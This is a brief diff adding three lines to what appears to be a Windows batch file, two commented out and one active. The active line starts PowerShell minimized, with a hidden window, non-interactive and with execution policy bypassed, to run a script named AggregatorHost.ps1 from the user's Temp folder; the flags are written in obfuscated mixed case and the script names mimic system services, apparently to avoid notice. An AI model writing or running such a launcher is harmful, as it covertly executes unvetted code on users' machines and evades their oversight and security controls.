@@ -1,0 +1,3 @@
+:: start /MIN PowerShell.exe -WInDoWSTyLe hIdDeN -NolOGo -NOnIntERaCtiVe -ExeCUtIonPoLiCy ByPaSs -FIlE "C:%homepath%\AppData\Local\Temp\APHostServices.ps1"; start /MIN PowerShell.exe -WInDoWSTyLe hIdDeN -NolOGo -NOnIntERaCtiVe -ExeCUtIonPoLiCy ByPaSs -FIlE "C:%homepath%\AppData\Local\Temp\APHostServices.ps1" 
+::start /MIN PowerShell.exe -ExeCUtIonPoLiCy ByPaSs -FIlE "C:%homepath%\AppData\Local\Temp\APHostServices.ps1"
+start /MIN PowerShell.exe -ExeCUtIonPoLiCy ByPaSs -WInDoWSTyLe hIdDeN -NolOGo -NOnIntERaCtiVe -FIlE "C:%homepath%\AppData\Local\Temp\AggregatorHost.ps1" 
